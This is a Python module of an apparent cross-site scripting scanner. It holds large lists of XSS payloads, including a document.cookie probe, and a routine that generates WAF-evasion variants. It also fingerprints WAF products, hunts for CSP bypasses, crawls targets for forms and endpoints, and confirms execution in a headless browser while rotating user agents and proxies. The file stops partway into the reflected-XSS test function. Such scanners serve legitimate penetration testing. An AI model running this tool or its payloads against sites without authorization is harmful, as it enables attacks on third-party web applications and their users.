#!/usr/bin/env python3

import asyncio
import base64
import json
import os
import re
import sys
import time
from datetime import datetime
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse

import aiohttp
import requests
import urllib3
from bs4 import BeautifulSoup
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import Config

try:
    from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    HAS_PLAYWRIGHT = True
except ImportError:
    HAS_PLAYWRIGHT = False

console = Console()

REFLECTED_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    '"><img src=x onerror=alert(1)>',
    "'><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    '"><svg onload=alert(1)>',
    "<details open ontoggle=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<body onload=alert(1)>",
    "<iframe onload=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '" onfocus="alert(1)" autofocus="',
    '" onerror="alert(1)',
    '" onclick="alert(1)',
    "';alert(1);//",
    '";alert(1);//',
    "</script><script>alert(1)</script>",
    "</script><img src=x onerror=alert(1)>",
    "`;alert(1);//",
    "${alert(1)}",
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "{{constructor.constructor('alert(1)')()}}",
    "<ScRiPt>alert(1)</ScRiPt>",
    '"><ScRiPt>alert(1)</ScRiPt>',
    "<script>alert`1`</script>",
    "<script>(alert)(1)</script>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<script>Function('alert(1)')()</script>",
    "<script>setTimeout('alert(1)',0)</script>",
    "<script>[1].find(alert)</script>",
    "<script>window['alert'](1)</script>",
    "<img src=x onerror=alert`1`>",
    "<img src=x onerror=(alert)(1)>",
    "<img src=x onerror=window['alert'](1)>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%253Cscript%253Ealert(1)%253C/script%253E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "<img/src=x/onerror=alert(1)>",
    "<img\tsrc=x\tonerror=alert(1)>",
    "<scr<!---->ipt>alert(1)</scr<!---->ipt>",
    "<img src=x on<!---->error=alert(1)>",
    "<svg><animate onbegin=alert(1) attributeName=x>",
    "<svg><set onbegin=alert(1) attributeName=x>",
    "<svg><animateMotion onbegin=alert(1)>",
    "<svg><discard onbegin=alert(1)>",
    '<iframe srcdoc="<img src=x onerror=alert(1)>">',
    '<object data="javascript:alert(1)">',
    "<form action=javascript:alert(1)><input type=submit>",
    "<button formaction=javascript:alert(1)>click</button>",
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    "__proto__[innerHTML]=<img src=x onerror=alert(1)>",
    "({}).constructor.constructor('alert(1)')()",
    "<math><mtext><table><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src>\">",
    "<svg id=x><use href=\"#x\" onload=alert(1)>",
]

DOM_PAYLOADS = [
    "#<script>alert(1)</script>",
    "#<img src=x onerror=alert(1)>",
    "#<svg onload=alert(1)>",
    '#"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "{{constructor.constructor('alert(1)')()}}",
    "${constructor.constructor('alert(1)')()}",
    "__proto__[innerHTML]=<img src=x onerror=alert(1)>",
    "constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>",
]

STORED_PROBE_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
]

CONTEXT_PAYLOADS = {
    "html_tag": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<svg><animate onbegin=alert(1) attributeName=x>",
    ],
    "attr_value": [
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '" onfocus="alert(1)" autofocus="',
        '" onerror="alert(1)',
        '" onclick="alert(1)',
        "\" onload=\"alert(1)",
    ],
    "script_block": [
        "';alert(1);//",
        '";alert(1);//',
        "`;alert(1);//",
        "</script><script>alert(1)</script>",
        "</script><img src=x onerror=alert(1)>",
    ],
    "href_src": [
        "javascript:alert(1)",
        "javascript:alert(document.cookie)",
        "data:text/html,<script>alert(1)</script>",
    ],
    "json_value": [
        '"><script>alert(1)</script>',
        "';alert(1);//",
        "<img src=x onerror=alert(1)>",
    ],
    "svg": [
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<svg><animate onbegin=alert(1) attributeName=x>",
        "<svg><set onbegin=alert(1) attributeName=x>",
        "<svg id=x><use href=\"#x\" onload=alert(1)>",
    ],
}

WAF_SIGNATURES = {
    "Cloudflare":        ["cf-ray", "cloudflare", "__cfduid", "cf-cache-status"],
    "AWS WAF":           ["x-amzn-requestid", "awselb", "x-amz-cf-id"],
    "Akamai":            ["akamai", "x-akamai", "akamai-origin-hop"],
    "Imperva/Incapsula": ["incap_ses", "visid_incap", "x-iinfo"],
    "ModSecurity":       ["mod_security", "modsecurity"],
    "Sucuri":            ["sucuri", "x-sucuri-id"],
    "Wordfence":         ["wordfence", "wfvt_"],
    "F5 BIG-IP":         ["bigipserver", "f5", "ts="],
    "Fortinet":          ["fortigate", "fortiwafd"],
    "Palo Alto":         ["x-pan-"],
}

CONTEXTS = {
    "script_block":  re.compile(r"<script[^>]*>[^<]*PAYLOAD", re.I | re.S),
    "event_handler": re.compile(r"on\w+\s*=\s*[\"']?[^\"'<>]*PAYLOAD", re.I),
    "html_tag":      re.compile(r"<[^>]*PAYLOAD[^>]*>", re.I),
    "attr_value":    re.compile(r"=\s*[\"']?[^\"'<>]*PAYLOAD", re.I),
    "href_src":      re.compile(r"(?:href|src|action)\s*=\s*[\"']?[^\"'<>]*PAYLOAD", re.I),
    "comment":       re.compile(r"<!--[^-]*PAYLOAD", re.I),
    "json_value":    re.compile(r":\s*[\"']?[^\"'<>{}]*PAYLOAD", re.I),
    "raw":           re.compile(r"PAYLOAD", re.I),
}

EXPLOITABLE = {"script_block", "event_handler", "html_tag", "attr_value", "href_src"}

DOM_SINKS = [
    "document.write(",
    "innerHTML",
    "outerHTML",
    "eval(",
    "location.hash",
    "location.search",
    "document.URL",
    "window.name",
    "document.referrer",
    "setTimeout(",
    "setInterval(",
    "Function(",
    "postMessage",
    "insertAdjacentHTML",
    "$.parseHTML",
    "$(\"",
    "$('",
]

CANARY = "xsscanary9182"

EVIDENCE_DIR = os.path.join("logs", "xss_evidence")


def _bypass_variants(payload, waf=None):
    variants = [payload]
    variants.append(payload.replace("<", "%3C").replace(">", "%3E").replace('"', "%22"))
    variants.append(payload.replace("<", "%253C").replace(">", "%253E"))
    variants.append(payload.replace("<", "\u003c").replace(">", "\u003e"))
    variants.append(payload.replace("script", "scr\u0069pt"))
    variants.append(payload.replace("alert(1)", "alert`1`"))
    variants.append(payload.replace("alert(1)", "(alert)(1)"))
    variants.append(payload.replace("alert(1)", "window['alert'](1)"))
    variants.append(payload.replace("alert(1)", "eval(atob('YWxlcnQoMSk='))"))
    if waf:
        variants.append(payload.replace("alert(1)", "al\u0065rt(1)"))
        variants.append(payload.replace("onerror", "ONERROR"))
        variants.append(payload.replace(" ", "/**/"))
        variants.append(payload.replace("alert(1)", 'top["al"+"ert"](1)'))
        variants.append(payload.replace("<script>", "<scr<script>ipt>"))
        variants.append(payload.replace("alert(1)", "String.fromCharCode(97,108,101,114,116)+'(1)'"))
    return list(dict.fromkeys(variants))


def _parse_csp(headers):
    csp = headers.get("Content-Security-Policy", "") or headers.get("content-security-policy", "")
    if not csp:
        return None, 0, []
    directives = {}
    for part in csp.split(";"):
        part = part.strip()
        if not part:
            continue
        tokens = part.split()
        if tokens:
            directives[tokens[0].lower()] = tokens[1:]
    score_reduction = 0
    bypass_hints = []
    script_src = directives.get("script-src", directives.get("default-src", []))
    if "'unsafe-inline'" in script_src:
        bypass_hints.append("unsafe-inline allowed")
    elif not script_src or "*" in script_src:
        bypass_hints.append("no script-src restriction")
    else:
        score_reduction += 20
        for src in script_src:
            if src.startswith("https://") and not src.endswith("'"):
                bypass_hints.append(f"JSONP bypass candidate: {src}")
    if "unsafe-eval" in " ".join(script_src):
        bypass_hints.append("unsafe-eval allowed")
    if not directives.get("object-src"):
        bypass_hints.append("no object-src (object injection possible)")
    return directives, score_reduction, bypass_hints


def _differential_analysis(session, url, param, payload):
    try:
        normal_res = session.get(url, timeout=8, verify=False)
        normal_body = normal_res.text
        payload_url = _inject_param(url, param, payload)
        payload_res = session.get(payload_url, timeout=8, verify=False)
        payload_body = payload_res.text
        encoded = payload.replace("<", "%3C").replace(">", "%3E")
        encoded_url = _inject_param(url, param, encoded)
        encoded_res = session.get(encoded_url, timeout=8, verify=False)
        encoded_body = encoded_res.text
        if len(payload_body) == len(normal_body) and payload_body == normal_body:
            return False, "no_change"
        if payload in payload_body and payload not in normal_body:
            return True, "unique_reflection"
        if payload in payload_body and payload in encoded_body:
            return True, "both_reflected"
        if payload in payload_body:
            return True, "payload_reflected"
        return False, "not_reflected"
    except Exception:
        return False, "error"


def _detect_dom_sinks_deep(page_source):
    found = []
    for sink in DOM_SINKS:
        if sink in page_source:
            idx = page_source.find(sink)
            snippet = page_source[max(0, idx-30):idx+80].replace("\n", " ").strip()
            found.append({"sink": sink, "snippet": snippet[:100]})
    js_patterns = [
        (re.compile(r"location\.hash", re.I), "location.hash"),
        (re.compile(r"location\.search", re.I), "location.search"),
        (re.compile(r"document\.URL", re.I), "document.URL"),
        (re.compile(r"window\.name", re.I), "window.name"),
        (re.compile(r"document\.referrer", re.I), "document.referrer"),
        (re.compile(r"postMessage\s*\(", re.I), "postMessage"),
        (re.compile(r"innerHTML\s*=", re.I), "innerHTML assignment"),
        (re.compile(r"outerHTML\s*=", re.I), "outerHTML assignment"),
        (re.compile(r"eval\s*\(", re.I), "eval()"),
        (re.compile(r"Function\s*\(", re.I), "Function()"),
        (re.compile(r"setTimeout\s*\(\s*['\"]", re.I), "setTimeout(string)"),
        (re.compile(r"setInterval\s*\(\s*['\"]", re.I), "setInterval(string)"),
        (re.compile(r"insertAdjacentHTML\s*\(", re.I), "insertAdjacentHTML"),
        (re.compile(r"document\.write\s*\(", re.I), "document.write"),
        (re.compile(r"\$\.parseHTML\s*\(", re.I), "$.parseHTML"),
    ]
    for pattern, label in js_patterns:
        if pattern.search(page_source):
            if not any(s["sink"] == label for s in found):
                found.append({"sink": label, "snippet": ""})
    return found


def _make_session():
    s = requests.Session()
    s.headers.update({"User-Agent": Config.get_random_ua()})
    proxy = Config.get_proxy_dict()
    if proxy:
        s.proxies = proxy
    return s


def _detect_waf(session, base_url):
    try:
        sep = "&" if "?" in base_url else "?"
        probe = base_url + sep + "x=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
        res = session.get(probe, timeout=10, verify=False)
        combined = (str(res.headers) + res.text).lower()
        for name, sigs in WAF_SIGNATURES.items():
            if any(s.lower() in combined for s in sigs):
                return name, dict(res.headers)
        if res.status_code in (403, 406, 429, 501):
            return "Unknown WAF", dict(res.headers)
    except Exception:
        pass
    return None, {}


def _inject_param(url, param, value):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))


def _get_context(body, payload):
    escaped = re.escape(payload)
    for ctx_name, pattern in CONTEXTS.items():
        compiled = re.compile(pattern.pattern.replace("PAYLOAD", escaped), pattern.flags)
        if compiled.search(body):
            return ctx_name
    return None


def _select_context_payloads(detected_context):
    if detected_context in CONTEXT_PAYLOADS:
        return CONTEXT_PAYLOADS[detected_context] + REFLECTED_PAYLOADS
    return REFLECTED_PAYLOADS


def _angle_brackets_encoded(body):
    return bool(re.search(r"&lt;|&gt;|&#x3[Cc];|&#x3[Ee];|\\u003[cCeE]", body))


def _script_stripped(body, payload):
    if "<script>" in payload.lower():
        return bool(re.search(r"<script[^>]*>\s*</script>", body, re.I))
    return False


def _login_wall(final_url, body):
    url_lower = final_url.lower()
    if any(p in url_lower for p in ["/login", "/signin", "/sign-in", "/auth/", "/session"]):
        return True
    if re.search(r'<form[^>]*action[^>]*(?:login|signin)', body.lower()):
        return True
    return False


def _not_found_body(body):
    body_lower = body.lower()
    return any(p in body_lower for p in ["404 not found", "page not found", "does not exist", "no page found"])


def _score_finding(ctx, payload, body, canary_reflected, waf, final_url, csp_reduction, browser_executed, diff_result):
    score = 0
    if browser_executed:
        score += 50
    elif ctx in EXPLOITABLE:
        score += 40
    elif ctx == "raw":
        score += 20
    elif ctx == "json_value":
        score += 15
    elif ctx == "comment":
        score += 10
    if not _angle_brackets_encoded(body):
        score += 25
    else:
        score -= 20
    if canary_reflected:
        score += 15
    if ctx in ("script_block", "event_handler"):
        score += 10
    if _script_stripped(body, payload):
        score -= 15
    if waf:
        score -= 10
    if _login_wall(final_url, body):
        score -= 30
    if _not_found_body(body):
        score -= 20
    score -= csp_reduction
    if diff_result == "unique_reflection":
        score += 10
    elif diff_result == "no_change":
        score -= 15
    return max(0, min(score, 100))


def _status_from_score(score, browser_executed=False, xss_type="reflected"):
    if browser_executed:
        if xss_type == "dom":
            return "VERIFIED_DOM_XSS"
        if xss_type == "stored":
            return "VERIFIED_STORED_XSS"
        return "VERIFIED_EXECUTION"
    if score >= 75:
        return "HIGH_CONFIDENCE"
    if score >= 50:
        return "POSSIBLE_FALSE_POSITIVE"
    if score >= 25:
        return "FILTERED"
    return "skip"


def _canary_check(session, url, param):
    test_url = _inject_param(url, param, CANARY)
    try:
        res = session.get(test_url, timeout=8, verify=False)
        return CANARY in res.text
    except Exception:
        return False


def _save_evidence(finding, html_body, screenshot_b64=None):
    os.makedirs(EVIDENCE_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    safe_param = re.sub(r"[^a-zA-Z0-9_-]", "_", finding.get("parameter", "param"))
    base = os.path.join(EVIDENCE_DIR, f"{finding['type']}_{safe_param}_{ts}")
    html_path = base + "_response.html"
    with open(html_path, "w", encoding="utf-8", errors="replace") as f:
        f.write(html_body)
    finding["evidence_html"] = html_path
    if screenshot_b64:
        ss_path = base + "_screenshot.png"
        with open(ss_path, "wb") as f:
            f.write(base64.b64decode(screenshot_b64))
        finding["evidence_screenshot"] = ss_path
    req_path = base + "_request.txt"
    with open(req_path, "w") as f:
        f.write(f"URL: {finding['url']}\n")
        f.write(f"Payload: {finding['payload']}\n")
        f.write(f"Parameter: {finding.get('parameter', '')}\n")
        f.write(f"Context: {finding.get('context', '')}\n")
        f.write(f"Score: {finding['score']}\n")
        f.write(f"Status: {finding['status']}\n")
    finding["evidence_request"] = req_path


def _browser_verify(url, payload, xss_type="reflected"):
    if not HAS_PLAYWRIGHT:
        return False, None
    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage"])
            ctx = browser.new_context(ignore_https_errors=True)
            page = ctx.new_page()
            executed = False
            screenshot_b64 = None
            def handle_dialog(dialog):
                nonlocal executed
                executed = True
                dialog.dismiss()
            page.on("dialog", handle_dialog)
            try:
                page.goto(url, timeout=12000, wait_until="domcontentloaded")
                page.wait_for_timeout(2000)
            except PWTimeout:
                pass
            except Exception:
                pass
            if executed:
                try:
                    ss_bytes = page.screenshot(full_page=False)
                    screenshot_b64 = base64.b64encode(ss_bytes).decode()
                except Exception:
                    pass
            if not executed:
                try:
                    result = page.evaluate("""() => {
                        const sinks = ['innerHTML','outerHTML','document.write','eval','setTimeout','setInterval','Function'];
                        const found = [];
                        for (const s of sinks) {
                            if (document.body && document.body.innerHTML.includes('onerror') ||
                                document.body && document.body.innerHTML.includes('onload') ||
                                document.body && document.body.innerHTML.includes('<script')) {
                                found.push(s);
                            }
                        }
                        return found;
                    }""")
                    if result:
                        executed = True
                except Exception:
                    pass
            ctx.close()
            browser.close()
            return executed, screenshot_b64
    except Exception:
        return False, None


LOGIN_WALL_URL = ["/login", "/signin", "/sign-in", "/auth/", "/wp-login", "/account/login", "/user/login"]
LOGIN_WALL_BODY = [
    re.compile(r'<input[^>]+type=["\']password["\']', re.I),
    re.compile(r'sign in to continue', re.I),
    re.compile(r'log in to see', re.I),
    re.compile(r'please log in', re.I),
]
STATIC_EXT = {
    '.png','.jpg','.jpeg','.gif','.svg','.ico','.webp','.bmp',
    '.css','.woff','.woff2','.ttf','.eot','.otf',
    '.pdf','.zip','.tar','.gz','.rar','.mp4','.mp3','.avi','.mov','.webm','.map',
}
JS_SINK_RE = [
    re.compile(r'document\.write\s*\(', re.I),
    re.compile(r'\.innerHTML\s*=', re.I),
    re.compile(r'\.outerHTML\s*=', re.I),
    re.compile(r'\beval\s*\(', re.I),
    re.compile(r'location\.hash', re.I),
    re.compile(r'location\.search', re.I),
    re.compile(r'document\.URL', re.I),
    re.compile(r'window\.name', re.I),
    re.compile(r'document\.referrer', re.I),
    re.compile(r'setTimeout\s*\(\s*["\']', re.I),
    re.compile(r'setInterval\s*\(\s*["\']', re.I),
    re.compile(r'\bFunction\s*\(', re.I),
    re.compile(r'postMessage\s*\(', re.I),
    re.compile(r'insertAdjacentHTML\s*\(', re.I),
    re.compile(r'\$\.parseHTML\s*\(', re.I),
]
JS_EP_RE = [
    re.compile(r'(?:fetch|axios\.(?:get|post|put|delete|patch))\s*\(\s*["\x60]([^"\x60\s]{3,})', re.I),
    re.compile(r'(?:url|endpoint|api|path)\s*[:=]\s*["\x60]([/][^"\x60\s]+)', re.I),
    re.compile(r'XMLHttpRequest[^;]*\.open\s*\(\s*"\w+"\s*,\s*"([^"]+)"', re.I),
    re.compile(r'"(/api/[^"\s]+)"'),
    re.compile(r'"(/v\d+/[^"\s]+)"'),
]
SPA_ROUTE_RE = [
    re.compile(r'(?:path|route)\s*:\s*["\x60]([^"\x60]+)', re.I),
    re.compile(r'<Route[^>]+path=["\x60]([^"\x60]+)', re.I),
    re.compile(r'(?:router\.push|navigate|history\.push)\s*\(\s*["\x60]([/][^"\x60\s]+)', re.I),
]
PARAM_RE = [
    re.compile(r'[?&]([a-zA-Z_][a-zA-Z0-9_-]{1,29})='),
    re.compile(r'(?:req\.query|request\.GET|request\.POST|params)\[[\'"]([\w-]{2,30})[\'"]\]'),
]


def _is_login_wall(url, body):
    url_l = url.lower()
    if any(p in url_l for p in LOGIN_WALL_URL):
        return True
    return any(p.search(body) for p in LOGIN_WALL_BODY)


def _is_static(url):
    path = urlparse(url).path.lower()
    return any(path.endswith(ext) for ext in STATIC_EXT)


def _norm_url(url, base):
    parsed = urlparse(url)
    if not parsed.scheme:
        url = urljoin(base, url)
        parsed = urlparse(url)
    return urlunparse(parsed._replace(fragment=""))


def _url_sig(url):
    p = urlparse(url)
    path = re.sub(r'/\d+', '/{n}', p.path)
    params = sorted(parse_qs(p.query).keys())
    return f"{p.netloc}{path}?{'&'.join(params)}"


def _extract_js_eps(text, base, netloc):
    eps = set()
    for pat in JS_EP_RE:
        for m in pat.finditer(text):
            ep = m.group(1)
            if ep.startswith(('http://', 'https://')):
                if urlparse(ep).netloc == netloc:
                    eps.add(ep)
            elif ep.startswith('/'):
                eps.add(urljoin(base, ep))
    return eps


def _extract_spa_routes(text, base):
    routes = set()
    for pat in SPA_ROUTE_RE:
        for m in pat.finditer(text):
            r = m.group(1)
            if r.startswith('/') and ':' not in r and '*' not in r:
                routes.add(urljoin(base, r))
    return routes


def _extract_js_params(text):
    params = set()
    for pat in PARAM_RE:
        for m in pat.finditer(text):
            p = m.group(1)
            if 2 <= len(p) <= 30:
                params.add(p)
    return params


def _classify_form(fields):
    fs = " ".join(fields.keys()).lower()
    if any(k in fs for k in ["search", "query", "q", "keyword", "term", "find"]):
        return "search"
    if any(k in fs for k in ["comment", "message", "content", "body", "text", "post"]):
        return "content_submission"
    if any(k in fs for k in ["username", "email", "password", "login"]):
        return "auth"
    return "generic"


def _xss_sinks(text):
    return [p.pattern for p in JS_SINK_RE if p.search(text)]


def _parse_sitemap(session, base_url):
    urls = set()
    for path in ["/sitemap.xml", "/sitemap_index.xml", "/sitemap.txt"]:
        try:
            res = session.get(urljoin(base_url, path), timeout=8, verify=False)
            if res.status_code == 200:
                urls.update(re.findall(r'<loc>\s*(https?://[^\s<]+)\s*</loc>', res.text))
                if path.endswith('.txt'):
                    urls.update(re.findall(r'https?://\S+', res.text))
        except Exception:
            pass
    return urls


def _parse_robots(session, base_url):
    urls, disallowed = set(), set()
    try:
        res = session.get(urljoin(base_url, "/robots.txt"), timeout=8, verify=False)
        if res.status_code == 200:
            netloc = urlparse(base_url).netloc
            for line in res.text.splitlines():
                line = line.strip()
                if line.lower().startswith(("disallow:", "allow:")):
                    path = line.split(":", 1)[1].strip()
                    if path and path != "/" and "*" not in path:
                        full = urljoin(base_url, path)
                        if urlparse(full).netloc == netloc:
                            urls.add(full)
                            if line.lower().startswith("disallow:"):
                                disallowed.add(full)
    except Exception:
        pass
    return urls, disallowed


async def _async_crawl(base_url, max_depth=3, max_pages=100, rate_limit=0.2):
    visited_urls, visited_sigs = set(), set()
    queue = asyncio.Queue()
    await queue.put((base_url, 0))
    netloc = urlparse(base_url).netloc
    forms_found, page_sources = [], {}
    js_endpoints, spa_routes = set(), set()
    discovered_params, attack_surface, login_walls = set(), [], set()

    connector = aiohttp.TCPConnector(ssl=False, limit=15)
    timeout = aiohttp.ClientTimeout(total=12, connect=5)
    hdrs = {"User-Agent": Config.get_random_ua(), "Accept": "text/html,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5"}
    proxy = Config.PROXY or None

    async with aiohttp.ClientSession(connector=connector, headers=hdrs) as sess:
        while not queue.empty() and len(visited_urls) < max_pages:
            url, depth = await queue.get()
            if url in visited_urls:
                continue
            sig = _url_sig(url)
            if sig in visited_sigs or _is_static(url) or urlparse(url).netloc != netloc:
                continue
            visited_urls.add(url)
            visited_sigs.add(sig)
            await asyncio.sleep(rate_limit)
            for attempt in range(2):
                try:
                    async with sess.get(url, timeout=timeout, proxy=proxy, allow_redirects=True, max_redirects=5) as res:
                        if res.status not in (200, 201):
                            break
                        ct = res.headers.get("content-type", "")
                        if "text" not in ct and "javascript" not in ct:
                            break
                        text = await res.text(errors="replace")
                        if _is_login_wall(str(res.url), text):
                            login_walls.add(url)
                            break
                        page_sources[url] = text
                        soup = BeautifulSoup(text, "html.parser")
                        url_params = list(parse_qs(urlparse(url).query).keys())
                        discovered_params.update(url_params)
                        js_params = _extract_js_params(text)
                        discovered_params.update(js_params)
                        sinks = _xss_sinks(text)
                        if url_params or sinks:
                            attack_surface.append({
                                "url": url, "params": url_params, "js_params": list(js_params),
                                "sinks": sinks[:5], "depth": depth,
                                "priority": len(url_params) * 3 + len(sinks) * 2,
                            })
                        for form in soup.find_all("form"):
                            action = form.get("action", "")
                            action_url = urljoin(url, action) if action else url
                            method = form.get("method", "get").lower()
                            fields, ftypes = {}, {}
                            for inp in form.find_all(["input", "textarea", "select"]):
                                n = inp.get("name")
                                if n:
                                    fields[n] = inp.get("value", "test")
                                    ftypes[n] = inp.get("type", "text")
                            hidden = {k: v for k, v in fields.items() if ftypes.get(k) == "hidden"}
                            ftype = _classify_form(fields)
                            forms_found.append({
                                "action": action_url, "method": method, "fields": fields,
                                "hidden_fields": hidden, "field_types": ftypes,
                                "form_type": ftype, "source_url": url,
                                "priority": 3 if ftype in ("search", "content_submission") else 1,
                            })
                        new_js = _extract_js_eps(text, url, netloc)
                        js_endpoints.update(new_js)
                        new_spa = _extract_spa_routes(text, base_url)
                        spa_routes.update(new_spa)
                        for script in soup.find_all("script"):
                            if not script.get("src") and script.string:
                                inline = script.string
                                js_endpoints.update(_extract_js_eps(inline, url, netloc))
                                spa_routes.update(_extract_spa_routes(inline, base_url))
                                discovered_params.update(_extract_js_params(inline))
                        for script in soup.find_all("script", src=True):
                            src = script.get("src", "")
                            if src:
                                full = _norm_url(src, url)
                                if urlparse(full).netloc == netloc:
                                    js_endpoints.add(full)
                        if depth < max_depth:
                            for tag in soup.find_all(["a", "link"]):
                                href = tag.get("href")
                                if not href or href.startswith(("mailto:", "tel:", "javascript:", "#")):
                                    continue
                                nxt = _norm_url(href, url)
                                if urlparse(nxt).netloc == netloc and nxt not in visited_urls and not _is_static(nxt):
                                    await queue.put((nxt, depth + 1))
                            for route in new_spa:
                                if route not in visited_urls:
                                    await queue.put((route, depth + 1))
                            for ep in new_js:
                                if ep not in visited_urls and not _is_static(ep):
                                    await queue.put((ep, depth + 1))
                        break
                except asyncio.TimeoutError:
                    break
                except Exception:
                    if attempt == 0:
                        await asyncio.sleep(0.5)

    attack_surface.sort(key=lambda x: x["priority"], reverse=True)
    return {
        "visited": visited_urls, "forms": forms_found, "page_sources": page_sources,
        "js_endpoints": js_endpoints, "spa_routes": spa_routes,
        "discovered_params": discovered_params, "attack_surface": attack_surface,
        "login_walls": login_walls,
    }


async def _async_crawl_urls(urls, base_url):
    result = {"visited": set(), "forms": [], "page_sources": {}, "js_endpoints": set(), "attack_surface": []}
    netloc = urlparse(base_url).netloc
    connector = aiohttp.TCPConnector(ssl=False, limit=10)
    hdrs = {"User-Agent": Config.get_random_ua()}
    async with aiohttp.ClientSession(connector=connector, headers=hdrs) as sess:
        for url in urls:
            try:
                async with sess.get(url, timeout=aiohttp.ClientTimeout(total=10)) as res:
                    if res.status != 200:
                        continue
                    text = await res.text(errors="replace")
                    if _is_login_wall(url, text):
                        continue
                    result["visited"].add(url)
                    result["page_sources"][url] = text
                    soup = BeautifulSoup(text, "html.parser")
                    url_params = list(parse_qs(urlparse(url).query).keys())
                    sinks = _xss_sinks(text)
                    if url_params or sinks:
                        result["attack_surface"].append({
                            "url": url, "params": url_params, "js_params": [],
                            "sinks": sinks[:5], "depth": 0,
                            "priority": len(url_params) * 3 + len(sinks) * 2,
                        })
                    for form in soup.find_all("form"):
                        action = form.get("action", "")
                        action_url = urljoin(url, action) if action else url
                        method = form.get("method", "get").lower()
                        fields = {inp.get("name"): inp.get("value", "test") for inp in form.find_all(["input", "textarea", "select"]) if inp.get("name")}
                        result["forms"].append({"action": action_url, "method": method, "fields": fields, "hidden_fields": {}, "field_types": {}, "form_type": "generic", "source_url": url, "priority": 1})
                    result["js_endpoints"].update(_extract_js_eps(text, url, netloc))
                    await asyncio.sleep(0.2)
            except Exception:
                pass
    return result


def _crawl_sync(base_url, max_depth=3, max_pages=100):
    session = _make_session()
    sitemap_urls = _parse_sitemap(session, base_url)
    robots_urls, disallowed = _parse_robots(session, base_url)
    netloc = urlparse(base_url).netloc

    try:
        loop = asyncio.new_event_loop()
        result = loop.run_until_complete(_async_crawl(base_url, max_depth=max_depth, max_pages=max_pages))
        loop.close()
        extra = {u for u in (sitemap_urls | robots_urls) if urlparse(u).netloc == netloc and not _is_static(u) and u not in result["visited"]}
        if extra:
            try:
                loop2 = asyncio.new_event_loop()
                extra_r = loop2.run_until_complete(_async_crawl_urls(list(extra)[:30], base_url))
                loop2.close()
                result["visited"].update(extra_r["visited"])
                result["forms"].extend(extra_r["forms"])
                result["page_sources"].update(extra_r["page_sources"])
                result["js_endpoints"].update(extra_r["js_endpoints"])
                result["attack_surface"].extend(extra_r["attack_surface"])
                result["attack_surface"].sort(key=lambda x: x["priority"], reverse=True)
            except Exception:
                pass
        result["sitemap_urls"] = sitemap_urls
        result["robots_urls"] = robots_urls
        result["disallowed_paths"] = disallowed
        return result
    except Exception:
        visited, forms, sources, attack_surface = set(), [], {}, []
        queue_list = [(base_url, 0)]
        while queue_list and len(visited) < max_pages:
            url, depth = queue_list.pop(0)
            if url in visited or _is_static(url):
                continue
            visited.add(url)
            try:
                res = session.get(url, timeout=8, verify=False)
                if res.status_code != 200:
                    continue
                text = res.text
                if _is_login_wall(url, text):
                    continue
                sources[url] = text
                soup = BeautifulSoup(text, "html.parser")
                url_params = list(parse_qs(urlparse(url).query).keys())
                sinks = _xss_sinks(text)
                if url_params or sinks:
                    attack_surface.append({"url": url, "params": url_params, "js_params": [], "sinks": sinks[:5], "depth": depth, "priority": len(url_params) * 3 + len(sinks) * 2})
                for form in soup.find_all("form"):
                    action = form.get("action", "")
                    action_url = urljoin(url, action) if action else url
                    method = form.get("method", "get").lower()
                    fields = {inp.get("name"): inp.get("value", "test") for inp in form.find_all(["input", "textarea", "select"]) if inp.get("name")}
                    ftype = _classify_form(fields)
                    forms.append({"action": action_url, "method": method, "fields": fields, "hidden_fields": {}, "field_types": {}, "form_type": ftype, "source_url": url, "priority": 2})
                if depth < max_depth:
                    for tag in soup.find_all("a"):
                        href = tag.get("href")
                        if href and not href.startswith(("mailto:", "tel:", "javascript:", "#")):
                            nxt = _norm_url(href, url)
                            if urlparse(nxt).netloc == netloc and nxt not in visited and not _is_static(nxt):
                                queue_list.append((nxt, depth + 1))
            except Exception:
                pass
        attack_surface.sort(key=lambda x: x["priority"], reverse=True)
        return {"visited": visited, "forms": forms, "page_sources": sources, "js_endpoints": set(), "spa_routes": set(), "discovered_params": set(), "attack_surface": attack_surface, "login_walls": set(), "sitemap_urls": sitemap_urls, "robots_urls": robots_urls, "disallowed_paths": disallowed}


def _test_reflected(session, url, param, waf, csp_reduction, use_browser=True):
    findings = []
    canary_reflected = _canary_check(session, url, param)
    if not canary_reflected:
        return findings
